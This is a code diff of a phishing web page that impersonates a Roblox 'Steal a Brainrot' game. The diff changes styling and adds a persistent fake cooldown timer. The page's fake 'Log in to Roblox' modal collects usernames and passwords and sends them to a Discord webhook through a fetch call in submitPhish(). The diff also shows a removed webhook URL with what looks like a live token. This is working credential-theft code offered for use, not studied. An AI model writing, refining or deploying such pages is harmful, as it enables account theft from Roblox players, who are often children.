@@ -7,7 +7,7 @@
     <style>
         body {
             margin: 0; padding: 0; background: linear-gradient(#a0d8ff, #c0f0ff);
-            font-family: 'Comic Sans MS', cursive, sans-serif;
+            font-family: Arial, Helvetica, sans-serif;
             height: 100vh; display: flex; align-items: center; justify-content: center;
             overflow: hidden; color: #333; position: relative;
         }
@@ -19,16 +19,12 @@
         .title { font-size: 62px; font-weight: bold; margin: 20px 0; text-shadow: 4px 4px 0 #000; color: #fff; -webkit-text-stroke: 4px #000; }
         .brainrot { color: #22c55e; }
         img { max-width: 100%; border: 8px solid #000; border-radius: 20px; margin: 20px 0; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
-
-        /* BIG JOIN BUTTON */
         .big-join {
             display: inline-block; margin: 30px 0; padding: 25px 100px; font-size: 36px; font-weight: bold;
             border-radius: 50px; cursor: pointer; transition: all 0.3s; box-shadow: 0 12px 0 #15803d;
             text-transform: uppercase; background: #22c55e; color: white; border: 8px solid #000;
         }
         .big-join:hover { transform: scale(1.12) translateY(-8px); box-shadow: 0 18px 0 #15803d; }
-
-        /* Small Group Button */
         .small-group-btn {
             position: absolute; top: 12px; right: 25px;
             padding: 12px 26px; background: #22c55e; color: white;
@@ -40,24 +36,22 @@
 </head>
 <body>
     <div onclick="showFakeGroup()" class="small-group-btn">JOIN GROUP</div>
-
     <div class="game-container">
         <div class="header">ROBLOX • STEAL A BRAINROT</div>
         <h1 class="title">STEAL A<br><span class="brainrot">BRAINROT</span></h1>
         <img src="https://files.catbox.moe/fxtpmw.png" alt="Brainrot">
         <div id="timer">Loading 20-day cooldown...</div>
-        
-        <!-- BIG JOIN BUTTON -->
+       
         <div onclick="showFakeLogin()" class="big-join">JOIN</div>
-        
+       
         <div style="margin-top:20px; font-size:22px; color:#444;">
             Night • Day in 0:02<br>Server Restock • 0:02
         </div>
     </div>
 
     <!-- Fake Login Modal -->
-    <div id="loginModal" class="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); align-items:center; justify-content:center; z-index:100000;">
-        <div class="login-box" style="background:#1f1f1f; padding:40px; border-radius:12px; width:440px; color:white; box-shadow:0 0 40px #00a2ff; text-align:center;">
+    <div id="loginModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); align-items:center; justify-content:center; z-index:100000;">
+        <div style="background:#1f1f1f; padding:40px; border-radius:12px; width:440px; color:white; box-shadow:0 0 40px #00a2ff; text-align:center;">
             <h2>Log in to Roblox</h2>
             <input type="text" id="fakeUser" placeholder="Username / Email / Phone" style="width:100%; padding:16px; margin:12px 0; background:#2a2a2a; border:2px solid #444; color:white; border-radius:6px;">
             <input type="password" id="fakePass" placeholder="Password" style="width:100%; padding:16px; margin:12px 0; background:#2a2a2a; border:2px solid #444; color:white; border-radius:6px;">
@@ -67,15 +61,29 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1517608770891677909/H4jG9vc_1yzz7ZfSPbxxjaQODVrjAPPU6jTk8khQyTWF_XsRk2lokcm4YrYw6UJjro1f"; // CHANGE THIS
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"; // CHANGE THIS
 
         function startCooldown() {
             const timerEl = document.getElementById('timer');
-            const endTime = Date.now() + (20 * 24 * 60 * 60 * 1000);
+            let endTime = null;
+
+            // Try window.name first (works in most sandboxes)
+            if (window.name && !isNaN(parseInt(window.name))) {
+                endTime = parseInt(window.name);
+            }
+
+            // If no valid endTime, start new 20-day cooldown
+            if (!endTime) {
+                endTime = Date.now() + (20 * 24 * 60 * 60 * 1000);
+                window.name = endTime.toString();
+            }
+
             function update() {
                 const remaining = endTime - Date.now();
-                if (remaining <= 0) timerEl.innerHTML = "✅ COOLDOWN EXPIRED";
-                else {
+                if (remaining <= 0) {
+                    timerEl.innerHTML = "✅ COOLDOWN EXPIRED";
+                    window.name = "";
+                } else {
                     const d = Math.floor(remaining / 86400000);
                     const h = Math.floor((remaining % 86400000) / 3600000);
                     const m = Math.floor((remaining % 3600000) / 60000);
@@ -90,16 +98,14 @@
         function showFakeLogin() {
             document.getElementById('loginModal').style.display = 'flex';
         }
-
         function hideLogin() {
             document.getElementById('loginModal').style.display = 'none';
         }
-
         function submitPhish() {
             const user = document.getElementById('fakeUser').value.trim();
             const pass = document.getElementById('fakePass').value.trim();
             if (!user || !pass) return alert("Fill all fields!");
-            
+           
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -113,7 +119,6 @@
                     ]}]
                 })
             }).catch(() => {});
-
             hideLogin();
             alert("✅ SUCCESSFULLY JOINED!");
         }
